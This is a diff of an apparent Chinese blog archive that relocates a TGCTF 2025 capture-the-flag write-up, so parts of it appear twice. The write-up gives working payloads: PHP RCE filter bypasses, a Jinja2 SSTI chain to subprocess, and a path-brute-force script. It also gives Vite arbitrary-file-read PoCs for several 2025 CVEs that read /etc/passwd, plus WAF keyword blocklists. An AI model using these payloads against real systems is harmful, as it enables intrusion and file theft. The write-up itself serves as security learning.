-<span class="string">或许你这只叫天命人的猴子，真的能做到？</span>
-<span class="string"></span>
-<span class="string">Image&#x27;</span>
-    <span class="keyword">try</span>:
-        <span class="keyword">return</span> template1+render_template_string(template)+render_template_string(template2)
-    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
-        error_message = <span class="string">f&quot;500报错了，查询语句如下：</span>
-<span class="string"><span class="subst">&#123;template&#125;</span>&quot;</span>
-        <span class="keyword">return</span> error_message, <span class="number">400</span>
-
-<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span>
-<span class="keyword">def</span> <span class="title function_">hinter</span>():
-    template=<span class="string">&quot;hint：</span>
-<span class="string">有一个aazz路由，去那里看看吧，天命人!&quot;</span>
-    <span class="keyword">return</span> render_template_string(template)
-
-<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/aazz&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span>
-<span class="keyword">def</span> <span class="title function_">finder</span>():
-    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
-        source_code = f.read()
-    <span class="keyword">return</span> <span class="string">f&quot;</span>
-<span class="string"><span class="subst">&#123;source_code&#125;</span></span>
-<span class="string">&quot;</span>, <span class="number">200</span>, &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;
-
-<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:
-    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413215533251.png" alt="image-20250413215533251"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413215326433.png" alt="image-20250413215326433"></p>
-<p>最终paylaod</p>
-<pre><code class="highlight plaintext">name=天命()[&#x27;\x5f\x5fclass\x5f\x5f&#x27;][&#x27;\x5f\x5fmro\x5f\x5f&#x27;][-1][&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;]()[351](&#x27;cat ntgffff11111aaaagggggggg&#x27;,shell=True,stdout=-1).communicate()[0].strip()难违</code></pre>
-
-<p>看队里师傅wp这题是能用fenjing的，有点难绷哈哈</p>
-<h3 id="前端游戏-复现"><a href="#前端游戏-复现" class="headerlink" title="前端游戏(复现)"></a>前端游戏(复现)</h3><p><code>CVE-2025-30208</code></p>
-<pre><code class="highlight plaintext">/@fs/tgflagggg?import&amp;raw??
-/@fs/tgflagggg?raw??</code></pre>
-
-
-
-<h3 id="前端游戏Plus-复现"><a href="#前端游戏Plus-复现" class="headerlink" title="前端游戏Plus (复现)"></a>前端游戏Plus (复现)</h3><p><code>CVE-2025-31486</code>的复现</p>
-<p>是一个任意文件读的漏洞</p>
-<p>先贴出poc</p>
-<pre><code class="highlight plaintext">/tgflagggg?.svg?.wasm?init</code></pre>
-
-<p>打完之后还尝试了一下打穿一下root</p>
-<pre><code class="highlight plaintext">/etc/passwd?.svg?.wasm?init</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250415135336099.png" alt="image-20250415135336099"></p>
-<p>看了一眼原CVE下的另一个poc</p>
-<pre><code class="highlight plaintext">curl &#x27;http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw&#x27;
-#https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</code></pre>
-
-<p>这个是打不穿的,因为前面目录的名字未知，不好打，贴一下官方WP的POC</p>
-<pre><code class="highlight plaintext">@fs/app/?/../../../../../tgflagggg?import&amp;?raw</code></pre>
-
-<h3 id="前端游戏Ultra-复现"><a href="#前端游戏Ultra-复现" class="headerlink" title="前端游戏Ultra(复现)"></a>前端游戏Ultra(复现)</h3><p>这三个前端的CVE都挺新的</p>
-<p><code>CVE-2025-32395</code></p>
-<p>先贴原漏洞的poc</p>
-<pre><code class="highlight plaintext">curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173
-#https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4</code></pre>
-
-<p>这个就是真要猜测路径了哈哈(</p>
-<p>幸好给了源码</p>
-<p>复现的时候哈基bar应激了，换了bp打<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250415141634705.png" alt="image-20250415141634705"></p>
-<p>不知道为什么官方poc给的是四个套，虽然不影响结果，但是先质疑再质疑哈</p>
-<p>顺带看到了另一个相关的CVE，也学习一下算了</p>
-<p><code>CVE-2025-31125</code></p>
-<p>这个洞是利用inline的规则配合.wsam进行绕过(是对第一个CVE的补丁的绕过)</p>
-<pre><code class="highlight plaintext">/@fs/C://windows/win.ini?import&amp;inline=1.wasm?init</code></pre>
-
-<p>这边引用一下大佬的解释好了</p>
-<pre><code class="highlight plaintext">除了?url和?raw还有一种内联的方法?inline，他的作用是：
-将文件（如图片、字体、WASM 等）的内容转换为 Base64 编码字符串 或 直接嵌入到 JS/HTML/CSS 中，避免额外的 HTTP 请求
-?init主要用于 WebAssembly（.wasm）文件的初始化，默认只有.wasm支持?init其他如.data、.bin可以通过插件拓展支持
-通过这种新的方法绕过了修复后的正则过滤
-//原链接https://cloud.tencent.com/developer/article/2513407</code></pre>
-
-]]></content>
-      <tags>
-        <tag>-WriteUp</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>RCE</title>
     <url>/2025/01/21/RCE/</url>
     <content><![CDATA[<h1 id="RCE（远程代码执行漏洞）原理及漏洞相关"><a href="#RCE（远程代码执行漏洞）原理及漏洞相关" class="headerlink" title="RCE（远程代码执行漏洞）原理及漏洞相关"></a>RCE（远程代码执行漏洞）原理及漏洞相关</h1><p>RCE，Romote Code Execution漏洞，即通过向后台服务器远程注入系统命令或代码来控制后台系统</p>
@@ -4120,6 +3806,320 @@ smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　<span class
       </tags>
   </entry>
   <entry>
+    <title>TGCTF_Writeup</title>
+    <url>/2025/04/18/TGCTF-Writeup/</url>
+    <content><![CDATA[<h1 id="TGCTF2025"><a href="#TGCTF2025" class="headerlink" title="TGCTF2025"></a>TGCTF2025</h1><p>这比赛说他好吧，确实让我发现自己的知识点漏洞有多大(哈哈，还是过过的知识点，恨不得给自己一巴掌，差点就可以卷铺盖走人了)。说差，你吗的前端游戏我一直以为题目就是那个错误页面，第二天又开才发现是正常的前端游戏，构式靶机。。。还有一堆莫名其妙的脑洞和对电波环节，有点。。了吧</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="AAA偷渡阴平"><a href="#AAA偷渡阴平" class="headerlink" title="AAA偷渡阴平"></a><strong>AAA偷渡阴平</strong></h3><pre><code class="highlight php"> <span class="meta">&lt;?php</span>
+
+
+<span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];
+
+<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;
+    <span class="comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span>
+    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);
+&#125;
+<span class="keyword">else</span>&#123;
+    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);
+&#125;
+
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</code></pre>
+
+<p>一眼无参RCE。。网上随便找个poc过了</p>
+<pre><code class="highlight php">?tgctf2025=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;jiang=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /f*&#x27;</span>);</code></pre>
+
+<h3 id="火眼辩魑魅"><a href="#火眼辩魑魅" class="headerlink" title="火眼辩魑魅"></a><strong>火眼辩魑魅</strong></h3><p>robots.txt </p>
+<pre><code class="highlight plaintext">User-Agent: *
+Disallow: tgupload.php
+Disallow: tgshell.php
+Disallow: tgxff.php
+Disallow: tgser.php
+Disallow: tgphp.php
+Disallow: tginclude.phphttp://node1.tgctf.woooo.tech:32484/</code></pre>
+
+<p>我是唇笔所以净喜欢走弯路哈哈。。</p>
+<p>明明题面已经说要看哪个了</p>
+<p>稍微尝试了一下发现system,passthru这些基本都被ban了</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250412143217444.png" alt="image-20250412143217444"></p>
+<pre><code class="highlight plaintext">shell=echo `cat /tg*`;</code></pre>
+
+<p>但是赛后看官方WP看红温了哈哈，官方给的是tgxff.php然后用ssti打，说是其他能打出来就是非预期哦，鉴定为史</p>
+<p>同时上面这个shell其实直接连都可以。。。算是绕弯了</p>
+<h3 id="AAA偷渡阴平-复仇"><a href="#AAA偷渡阴平-复仇" class="headerlink" title="AAA偷渡阴平(复仇)"></a><strong>AAA偷渡阴平(复仇)</strong></h3><p>ban了无参RCE，但是一样打</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];
+<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;
+    <span class="comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span>
+    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);
+&#125;
+<span class="keyword">else</span>&#123;
+    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);
+&#125;
+
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+</code></pre>
+
+<p>poc:</p>
+<pre><code class="highlight php">?tgctf2025=<span class="title function_ invoke__">session_start</span>();<span class="title function_ invoke__">passthru</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>()));
+PHPSESSID=<span class="number">636174202</span>f666c6167</code></pre>
+
+<h3 id="直面天命"><a href="#直面天命" class="headerlink" title="直面天命"></a><strong>直面天命</strong></h3><p>先看一眼源码</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221047192.png" alt="image-20250413221047192"></p>
+<p>换hint</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221120246.png" alt="image-20250413221120246"></p>
+<p>。。懒得喷，我直接pt买hint了哈哈</p>
+<p>这里贴一下队里师傅的脚本</p>
+<pre><code class="highlight py"><span class="keyword">import</span> requests
+<span class="keyword">import</span> itertools
+<span class="keyword">import</span> string
+<span class="keyword">import</span> time
+<span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor
+
+<span class="comment"># 目标网站的基础URL - 使用前请替换为实际目标URL</span>
+BASE_URL = <span class="string">&quot;http://node2.tgctf.woooo.tech:32010/&quot;</span>  <span class="comment"># 请替换为实际目标URL</span>
+
+<span class="comment"># 使用所有26个小写字母</span>
+all_letters = string.ascii_lowercase  <span class="comment"># &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>
+
+<span class="comment"># 定义测试单个路径的函数</span>
+
+
+<span class="keyword">def</span> <span class="title function_">test_path</span>(<span class="params">path</span>):
+    url = BASE_URL + path
+    <span class="keyword">try</span>:
+        response = requests.get(url, timeout=<span class="number">3</span>)
+
+        <span class="comment"># 根据状态码和响应长度来判断是否找到有效页面</span>
+        status = response.status_code
+        length = <span class="built_in">len</span>(response.text)
+
+        <span class="comment"># 记录所有非404响应</span>
+        <span class="keyword">if</span> status != <span class="number">404</span>:
+            <span class="built_in">print</span>(<span class="string">f&quot;[+] 发现: <span class="subst">&#123;url&#125;</span> (状态码: <span class="subst">&#123;status&#125;</span>, 长度: <span class="subst">&#123;length&#125;</span>)&quot;</span>)
+
+            <span class="comment"># 保存发现的路径到文件中</span>
+            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;found_paths.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:
+                f.write(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span> (状态码: <span class="subst">&#123;status&#125;</span>, 长度: <span class="subst">&#123;length&#125;</span>)\n&quot;</span>)
+
+            <span class="comment"># 如果是200状态码，保存响应内容以便检查</span>
+            <span class="keyword">if</span> status == <span class="number">200</span>:
+                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;response_<span class="subst">&#123;path&#125;</span>.html&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:
+                    f.write(response.text)
+
+    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:
+        <span class="keyword">pass</span>  <span class="comment"># 忽略连接错误，继续测试</span>
+
+    <span class="keyword">return</span> path
+
+
+<span class="comment"># 显示开始信息</span>
+<span class="built_in">print</span>(<span class="string">&quot;[*] 开始爆破所有4字母路径...&quot;</span>)
+<span class="built_in">print</span>(<span class="string">f&quot;[*] 目标URL: <span class="subst">&#123;BASE_URL&#125;</span>&quot;</span>)
+<span class="built_in">print</span>(<span class="string">f&quot;[*] 总组合数: <span class="subst">&#123;<span class="number">26</span>**<span class="number">4</span>&#125;</span> (这可能需要一些时间)&quot;</span>)
+
+<span class="comment"># 跟踪进度变量</span>
+total_combinations = <span class="number">26</span>**<span class="number">4</span>  <span class="comment"># 可能的4字母组合总数</span>
+completed = <span class="number">0</span>
+start_time = time.time()
+
+<span class="comment"># 使用多线程加速过程</span>
+<span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">20</span>) <span class="keyword">as</span> executor:
+    <span class="comment"># 生成并测试所有4字母组合</span>
+    <span class="keyword">for</span> combo <span class="keyword">in</span> itertools.product(all_letters, repeat=<span class="number">4</span>):
+        path = <span class="string">&#x27;&#x27;</span>.join(combo)
+        executor.submit(test_path, path)
+
+        <span class="comment"># 定期更新进度</span>
+        completed += <span class="number">1</span>
+        <span class="keyword">if</span> completed % <span class="number">5000</span> == <span class="number">0</span>:
+            elapsed = time.time() - start_time
+            percentage = (completed / total_combinations) * <span class="number">100</span>
+            rate = completed / elapsed <span class="keyword">if</span> elapsed &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>
+            remaining = (total_combinations - completed) / \
+                rate <span class="keyword">if</span> rate &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>
+
+            <span class="built_in">print</span>(<span class="string">f&quot;[*] 进度: <span class="subst">&#123;completed&#125;</span>/<span class="subst">&#123;total_combinations&#125;</span> (<span class="subst">&#123;percentage:<span class="number">.2</span>f&#125;</span>%) - &quot;</span>
+                  <span class="string">f&quot;已用时间: <span class="subst">&#123;elapsed:<span class="number">.1</span>f&#125;</span>秒 - 预计剩余: <span class="subst">&#123;remaining:<span class="number">.1</span>f&#125;</span>秒 - 速度: <span class="subst">&#123;rate:<span class="number">.1</span>f&#125;</span>请求/秒&quot;</span>)
+
+<span class="built_in">print</span>(<span class="string">&quot;[*] 爆破完成! 查看 &#x27;found_paths.txt&#x27; 获取结果。&quot;</span>)</code></pre>
+
+<p><code>/aazz</code></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221221814.png" alt="image-20250413221221814"></p>
+<p>…参…数……?那我问你，参数名是什么，那我问你(也有可能是我没进群所以没看到类似通知的缘故)</p>
+<p>反正后面知道是filename(赛后知道这个也是要fuzz出来的),看名字应该就是任意文件读取了</p>
+<p>稍微试一下啊</p>
+<p>预期应该是抓源码的，结果哈哈</p>
+<pre><code class="highlight plaintext">aazz?filename=../../flag</code></pre>
+
+<p>贴一个源码吧</p>
+<pre><code class="highlight python"><span class="keyword">import</span> os
+<span class="keyword">import</span> string
+<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory
+<span class="keyword">from</span> a.b.c.d.secret <span class="keyword">import</span> secret_key
+
+app = Flask(__name__)
+
+black_list=[<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>]
+<span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):
+    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:
+        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():
+            <span class="keyword">return</span> <span class="literal">True</span>
+    <span class="keyword">return</span> <span class="literal">False</span>
+<span class="keyword">def</span> <span class="title function_">is_typable</span>(<span class="params">char</span>):
+    <span class="comment"># 定义可通过标准 QWERTY 键盘输入的字符集</span>
+    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace
+    <span class="keyword">return</span> char <span class="keyword">in</span> typable_chars
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
+<span class="keyword">def</span> <span class="title function_">home</span>():
+    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jingu&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span>
+<span class="keyword">def</span> <span class="title function_">greet</span>():
+    template1=<span class="string">&quot;&quot;</span>
+    template2=<span class="string">&quot;&quot;</span>
+    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)
+    template = <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>
+    <span class="keyword">if</span> waf(name):
+        template = <span class="string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹</span></code></pre>
+
+
+
+<h3 id="直面天命（复仇）"><a href="#直面天命（复仇）" class="headerlink" title="直面天命（复仇）"></a><strong>直面天命（复仇）</strong></h3><pre><code class="highlight python"><span class="keyword">import</span> os
+<span class="keyword">import</span> string
+<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory
+<span class="keyword">from</span> a.b.c.d.secret <span class="keyword">import</span> secret_key
+
+app = Flask(__name__)
+
+black_list=[<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;map&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&#x27;pop&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;_.&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;application&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;arg&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]
+<span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):
+    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:
+        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():
+            <span class="keyword">return</span> <span class="literal">True</span>
+    <span class="keyword">return</span> <span class="literal">False</span>
+<span class="keyword">def</span> <span class="title function_">is_typable</span>(<span class="params">char</span>):
+    <span class="comment"># 定义可通过标准 QWERTY 键盘输入的字符集</span>
+    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace
+    <span class="keyword">return</span> char <span class="keyword">in</span> typable_chars
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
+<span class="keyword">def</span> <span class="title function_">home</span>():
+    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jingu&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span>
+<span class="keyword">def</span> <span class="title function_">greet</span>():
+    template1=<span class="string">&quot;&quot;</span>
+    template2=<span class="string">&quot;&quot;</span>
+    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)
+    template = <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>
+    <span class="keyword">if</span> waf(name):
+        template = <span class="string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹</span>
+<span class="string">Image&#x27;</span>
+    <span class="keyword">else</span>:
+        k=<span class="number">0</span>
+        <span class="keyword">for</span> i <span class="keyword">in</span> name:
+            <span class="keyword">if</span> is_typable(i):
+                <span class="keyword">continue</span>
+            k=<span class="number">1</span>
+            <span class="keyword">break</span>
+        <span class="keyword">if</span> k==<span class="number">1</span>:
+            <span class="keyword">if</span> <span class="keyword">not</span> (secret_key[:<span class="number">2</span>] <span class="keyword">in</span> name <span class="keyword">and</span> secret_key[<span class="number">2</span>:]):
+                template = <span class="string">&#x27;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧</span>
+<span class="string"></span>
+<span class="string">再去西行历练历练</span>
+<span class="string"></span>
+<span class="string">Image&#x27;</span>
+                <span class="keyword">return</span> render_template_string(template)
+            template1 = <span class="string">&quot;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;&#125;&#125;”</span>
+<span class="string">最后，如果你用了cat，就可以见到齐天大圣了</span>
+<span class="string">&quot;</span>
+            template= template.replace(<span class="string">&quot;天命&quot;</span>,<span class="string">&quot;&#123;&#123;&quot;</span>).replace(<span class="string">&quot;难违&quot;</span>,<span class="string">&quot;&#125;&#125;&quot;</span>)
+            template = template
+    <span class="keyword">if</span> <span class="string">&quot;cat&quot;</span> <span class="keyword">in</span> template:
+        template2 = <span class="string">&#x27;</span>
+<span class="string">或许你这只叫天命人的猴子，真的能做到？</span>
+<span class="string"></span>
+<span class="string">Image&#x27;</span>
+    <span class="keyword">try</span>:
+        <span class="keyword">return</span> template1+render_template_string(template)+render_template_string(template2)
+    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
+        error_message = <span class="string">f&quot;500报错了，查询语句如下：</span>
+<span class="string"><span class="subst">&#123;template&#125;</span>&quot;</span>
+        <span class="keyword">return</span> error_message, <span class="number">400</span>
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span>
+<span class="keyword">def</span> <span class="title function_">hinter</span>():
+    template=<span class="string">&quot;hint：</span>
+<span class="string">有一个aazz路由，去那里看看吧，天命人!&quot;</span>
+    <span class="keyword">return</span> render_template_string(template)
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/aazz&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span>
+<span class="keyword">def</span> <span class="title function_">finder</span>():
+    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
+        source_code = f.read()
+    <span class="keyword">return</span> <span class="string">f&quot;</span>
+<span class="string"><span class="subst">&#123;source_code&#125;</span></span>
+<span class="string">&quot;</span>, <span class="number">200</span>, &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:
+    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413215533251.png" alt="image-20250413215533251"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413215326433.png" alt="image-20250413215326433"></p>
+<p>最终paylaod</p>
+<pre><code class="highlight plaintext">name=天命()[&#x27;\x5f\x5fclass\x5f\x5f&#x27;][&#x27;\x5f\x5fmro\x5f\x5f&#x27;][-1][&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;]()[351](&#x27;cat ntgffff11111aaaagggggggg&#x27;,shell=True,stdout=-1).communicate()[0].strip()难违</code></pre>
+
+<p>看队里师傅wp这题是能用fenjing的，有点难绷哈哈</p>
+<h3 id="前端游戏-复现"><a href="#前端游戏-复现" class="headerlink" title="前端游戏(复现)"></a>前端游戏(复现)</h3><p><code>CVE-2025-30208</code></p>
+<pre><code class="highlight plaintext">/@fs/tgflagggg?import&amp;raw??
+/@fs/tgflagggg?raw??</code></pre>
+
+
+
+<h3 id="前端游戏Plus-复现"><a href="#前端游戏Plus-复现" class="headerlink" title="前端游戏Plus (复现)"></a>前端游戏Plus (复现)</h3><p><code>CVE-2025-31486</code>的复现</p>
+<p>是一个任意文件读的漏洞</p>
+<p>先贴出poc</p>
+<pre><code class="highlight plaintext">/tgflagggg?.svg?.wasm?init</code></pre>
+
+<p>打完之后还尝试了一下打穿一下root</p>
+<pre><code class="highlight plaintext">/etc/passwd?.svg?.wasm?init</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250415135336099.png" alt="image-20250415135336099"></p>
+<p>看了一眼原CVE下的另一个poc</p>
+<pre><code class="highlight plaintext">curl &#x27;http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw&#x27;
+#https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</code></pre>
+
+<p>这个是打不穿的,因为前面目录的名字未知，不好打，贴一下官方WP的POC</p>
+<pre><code class="highlight plaintext">@fs/app/?/../../../../../tgflagggg?import&amp;?raw</code></pre>
+
+<h3 id="前端游戏Ultra-复现"><a href="#前端游戏Ultra-复现" class="headerlink" title="前端游戏Ultra(复现)"></a>前端游戏Ultra(复现)</h3><p>这三个前端的CVE都挺新的</p>
+<p><code>CVE-2025-32395</code></p>
+<p>先贴原漏洞的poc</p>
+<pre><code class="highlight plaintext">curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173
+#https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4</code></pre>
+
+<p>这个就是真要猜测路径了哈哈(</p>
+<p>幸好给了源码</p>
+<p>复现的时候哈基bar应激了，换了bp打<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250415141634705.png" alt="image-20250415141634705"></p>
+<p>不知道为什么官方poc给的是四个套，虽然不影响结果，但是先质疑再质疑哈</p>
+<p>顺带看到了另一个相关的CVE，也学习一下算了</p>
+<p><code>CVE-2025-31125</code></p>
+<p>这个洞是利用inline的规则配合.wsam进行绕过(是对第一个CVE的补丁的绕过)</p>
+<pre><code class="highlight plaintext">/@fs/C://windows/win.ini?import&amp;inline=1.wasm?init</code></pre>
+
+<p>这边引用一下大佬的解释好了</p>
+<pre><code class="highlight plaintext">除了?url和?raw还有一种内联的方法?inline，他的作用是：
+将文件（如图片、字体、WASM 等）的内容转换为 Base64 编码字符串 或 直接嵌入到 JS/HTML/CSS 中，避免额外的 HTTP 请求
+?init主要用于 WebAssembly（.wasm）文件的初始化，默认只有.wasm支持?init其他如.data、.bin可以通过插件拓展支持
+通过这种新的方法绕过了修复后的正则过滤
+//原链接https://cloud.tencent.com/developer/article/2513407</code></pre>
+
+]]></content>
+      <tags>
+        <tag>-WriteUp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>VNCTF2025</title>
     <url>/2025/02/10/VNCTF2025/</url>
